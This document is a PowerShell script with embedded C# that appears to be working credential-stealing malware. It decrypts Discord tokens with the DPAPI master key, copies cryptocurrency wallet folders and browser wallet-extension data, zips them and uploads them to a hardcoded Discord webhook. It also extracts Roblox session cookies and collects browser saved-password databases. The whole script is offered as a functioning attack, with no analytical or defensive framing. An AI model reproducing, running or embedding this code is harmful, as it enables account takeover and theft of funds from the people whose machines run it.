Add-Type -AssemblyName System.Security
$csharp = @"
using System;
using System.Security.Cryptography;
public class Gcm {
    public static byte[] Decrypt(byte[] key, byte[] nonce, byte[] ct) {
        using (var aes = Aes.Create()) {
            aes.Key = key; aes.Mode = CipherMode.ECB; aes.Padding = PaddingMode.None;
            byte[] o = new byte[ct.Length];
            byte[] c = new byte[16]; Array.Copy(nonce, c, 12); c[15] = 2;
            using (var e = aes.CreateEncryptor()) {
                for (int i = 0; i < ct.Length; i += 16) {
                    byte[] k = e.TransformFinalBlock(c, 0, 16);
                    int n = Math.Min(16, ct.Length - i);
                    for (int j = 0; j < n; j++) o[i + j] = (byte)(ct[i + j] ^ k[j]);
                    for (int j = 15; j >= 12; j--) { if (++c[j] != 0) break; }
                }
            }
            return o;
        }
    }
}
"@
Add-Type -TypeDefinition $csharp -Language CSharp

$appdata = $env:APPDATA
$l = $env:LOCALAPPDATA
$outfile = Join-Path $env:TEMP "steal_result.txt"
Remove-Item $outfile -EA SilentlyContinue

$mk = $null
try {
    $ls = Get-Content "$appdata\discord\Local State" -Raw | ConvertFrom-Json
    $b = [Convert]::FromBase64String($ls.os_crypt.encrypted_key)
    $mk = [Security.Cryptography.ProtectedData]::Unprotect($b[5..($b.Length-1)], $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
} catch {}

$tokens = @{}
$discordPaths = @(
    "$appdata\discord\Local Storage\leveldb",
    "$appdata\discordptb\Local Storage\leveldb",
    "$appdata\discordcanary\Local Storage\leveldb"
)
foreach ($dp in $discordPaths) {
    if (!(Test-Path $dp)) { continue }
    Get-ChildItem $dp | ? { $_.Name -match '\.(ldb|log)$' } | % {
        $raw = $null
        try {
            $fs = [IO.File]::Open($_.FullName, [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite)
            $sr = New-Object IO.StreamReader($fs); $raw = $sr.ReadToEnd(); $sr.Close(); $fs.Close()
        } catch { return }
        if (!$raw -or !$mk) { return }
        foreach ($m in [regex]::Matches($raw, 'dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,300})')) {
            $b64 = $m.Groups[1].Value
            while ($b64.Length % 4 -ne 0) { $b64 += '=' }
            try {
                $eb = [Convert]::FromBase64String($b64)
                if ($eb.Length -lt 80) { continue }
                $t = [Text.Encoding]::UTF8.GetString([Gcm]::Decrypt($mk, $eb[3..14], $eb[15..($eb.Length-17)])).TrimEnd([char]0)
                if ($t.Length -gt 40 -and !$tokens[$t]) { $tokens[$t] = $t }
            } catch {}
        }
    }
}

foreach ($t in $tokens.Keys) {
    try {
        $r = Invoke-RestMethod 'https://discord.com/api/v9/users/@me' -Headers @{'Authorization'=$t} -TimeoutSec 5
        if ($r.username) {
            Add-Content $outfile "DISCORD|$($r.username)|$($r.email)|$($r.phone)|$($r.id)|$t"
        }
    } catch {}
}

$dw = @{Exodus="$appdata\Exodus";Atomic="$appdata\atomic";Electrum="$appdata\Electrum";Jaxx="$appdata\jaxx";Guarda="$appdata\Guarda";Coinomi="$appdata\Coinomi";Armory="$appdata\Armory"}
$bw = @{MetaMask='nkbihfbeogaeaoehlefnkodbefgpgknn';Phantom='bfnaelmomeimhlpmgjnjophhpkkoljpa';Ronin='fnjhmkhhmkbjkkabndcnnogagogbneec';BinanceChain='fhbohimaelbohpjbbldcngcnapndodjp';Coinbase='hnfanknocfeofbddgcijnmhfnkdnaad';TrustWallet='egjidjbpglichdcondbcbdnbeeppgdph';TronLink='ibnejdfjmmkpcnlpebklmnkoeoihofec'}
$br = @("$l\Google\Chrome\User Data","$l\Microsoft\Edge\User Data","$l\BraveSoftware\Brave-Browser\User Data","$appdata\Opera Software\Opera Stable")

# ─── WEBHOOK ───
$WH = "https://discord.com/api/webhooks/1375311447839608973/ILdJfm-Tu7IbvMPLxRZhhQk6esgMVMhRj8dxUXpbJwEy4F6XQhf-zfkRXrI3UC8xA7-T"

function dbg($title, $desc, $color) {
    $payload = @{embeds=@(@{title=$title; description=$desc; color=$color})} | ConvertTo-Json -Depth 4 -Compress
    try { Invoke-RestMethod $WH -Method Post -Body $payload -ContentType 'application/json' | Out-Null } catch {}
}

$staging = Join-Path $env:TEMP "wallets"
Remove-Item $staging -Recurse -Force -EA SilentlyContinue
mkdir $staging -Force | Out-Null

foreach ($n in $dw.Keys) {
    if (Test-Path $dw[$n]) {
        $dest = Join-Path $staging $n
        & robocopy $dw[$n] $dest /E /R:1 /W:1 /NFL /NDL /NJH /NJS /NC /NS /XD partitions logs tmp cache Cache blob_storage GPUCache Crashpad | Out-Null
    }
}
foreach ($n in $bw.Keys) {
    foreach ($bp in $br) {
        $ep = Join-Path $bp "Default\Local Extension Settings\$($bw[$n])"
        if (Test-Path $ep) {
            $dest = Join-Path $staging $n
            & robocopy $ep $dest /E /R:1 /W:1 /NFL /NDL /NJH /NJS /NC /NS | Out-Null
            break
        }
    }
}

$stagedDirs = Get-ChildItem $staging -Directory -EA SilentlyContinue
foreach ($d in $stagedDirs) {
    $zip = Join-Path $env:TEMP ($d.Name + ".zip")
    Remove-Item $zip -Force -EA SilentlyContinue
    Compress-Archive -Path $d.FullName -DestinationPath $zip -Force -EA SilentlyContinue
    if (Test-Path $zip) {
        $mb = [Math]::Round((Get-Item $zip).Length / 1MB, 2)
        if ((Get-Item $zip).Length -gt 8000000) {
            dbg ":x: Wallet Too Big" "$($d.Name) - $mb MB (over 8MB limit)" 16711680
        } else {
            $resp = & curl.exe -s -F "file=@$zip;filename=$($d.Name).zip" $WH 2>&1
            if ($resp -match '"id"') {
                dbg ":briefcase: Wallet Grabbed" "$($d.Name).zip - $mb MB" 65280
            } else {
                dbg ":x: Wallet Failed" "$($d.Name).zip - upload error" 16711680
            }
        }
        Remove-Item $zip -Force -EA SilentlyContinue
    }
}
Remove-Item $staging -Recurse -Force -EA SilentlyContinue

# Roblox cookie extraction
$rbxPaths = @(
    "$l\Roblox\LocalStorage\robloxcookies.dat",
    "$env:USERPROFILE\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
)
foreach ($rp in $rbxPaths) {
    if (Test-Path $rp) {
        try {
            $raw = Get-Content $rp -Raw
            if ($raw -match '"CookiesData"\s*:\s*"([^"]+)"') {
                $b64 = $Matches[1]
                $eb = [Convert]::FromBase64String($b64)
                $db = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
                $cookie = [Text.Encoding]::UTF8.GetString($db)
                if ($cookie -match '\.ROBLOSECURITY\s*=\s*(_[^;\s]+)') {
                    Add-Content $outfile "ROBLOX|$($Matches[1])"
                } elseif ($cookie -match '_\|WARNING[^;\s]{50,}') {
                    Add-Content $outfile "ROBLOX|$($Matches[0])"
                } else {
                    Add-Content $outfile "ROBLOX|$($cookie.Substring(0,[Math]::Min(500,$cookie.Length)))"
                }
            } elseif ($raw -match '\.ROBLOSECURITY') {
                Add-Content $outfile "ROBLOX|$raw"
            }
        } catch {}
        break
    }
}

$msPaths = @(
    "$l\RobloxPCGDK\LocalStorage\RobloxCookies.dat"
)
$pkgPath = "$l\Packages"
if (Test-Path $pkgPath) {
    $gdks = Get-ChildItem "$pkgPath\ROBLOXCorporation.RobloxGDK_*" -Directory -EA SilentlyContinue
    foreach ($gdk in $gdks) {
        $cp = Join-Path $gdk.FullName "LocalState\RobloxCookies.dat"
        if (Test-Path $cp) { $msPaths += $cp }
    }
}
foreach ($rp in $msPaths) {
    if (Test-Path $rp) {
        try {
            $raw = Get-Content $rp -Raw
            if ($raw -match '"CookiesData"\s*:\s*"([^"]+)"') {
                $eb = [Convert]::FromBase64String($Matches[1])
                $db = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
                $cookie = [Text.Encoding]::UTF8.GetString($db)
                if ($cookie -match '\.ROBLOSECURITY\s*=\s*(_[^;\s]+)') {
                    Add-Content $outfile "ROBLOXMS|$($Matches[1])"
                } elseif ($cookie -match '_\|WARNING[^;\s]{50,}') {
                    Add-Content $outfile "ROBLOXMS|$($Matches[0])"
                } else {
                    Add-Content $outfile "ROBLOXMS|$($cookie.Substring(0,[Math]::Min(500,$cookie.Length)))"
                }
            }
        } catch {}
        break
    }
}

$browsers = @(
    @{Name="Chrome";Path="$l\Google\Chrome\User Data"},
    @{Name="Edge";Path="$l\Microsoft\Edge\User Data"},
    @{Name="Brave";Path="$l\BraveSoftware\Brave-Browser\User Data"},
    @{Name="Opera";Path="$appdata\Opera Software\Opera Stable"},
    @{Name="OperaGX";Path="$appdata\Opera Software\Opera GX Stable"}
)
foreach ($br in $browsers) {
    if (!(Test-Path $br.Path)) { continue }
    $lp = Join-Path $br.Path "Default\Login Data"
    if (!(Test-Path $lp)) { $lp = Join-Path $br.Path "Login Data" }
    if (!(Test-Path $lp)) { continue }
    $copied = $false
    $tmp = Join-Path $env:TEMP "ld_$([Guid]::NewGuid()).db"
    try {
        $fs = [IO.File]::Open($lp, [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite)
        $ms = New-Object IO.MemoryStream
        $fs.CopyTo($ms); $fs.Close()
        [IO.File]::WriteAllBytes($tmp, $ms.ToArray())
        $ms.Close(); $copied = $true
    } catch {}
    if (!$copied) { Add-Content $outfile "PASSWORD|$($br.Name)|LOCKED||"; continue }
    try {
        $rawBytes = [IO.File]::ReadAllBytes($tmp)
        if ($rawBytes.Length -gt 800000) {
            Add-Content $outfile "PASSWORD|$($br.Name)|TOO_LARGE|$($rawBytes.Length)|"
        } else {
            $b64 = [Convert]::ToBase64String($rawBytes)
            Add-Content $outfile "PASSWORD|$($br.Name)|RAW_DB||$b64"
        }
    } catch { Add-Content $outfile "PASSWORD|$($br.Name)|READ_ERROR||" }
    Remove-Item $tmp -Force -EA SilentlyContinue
}
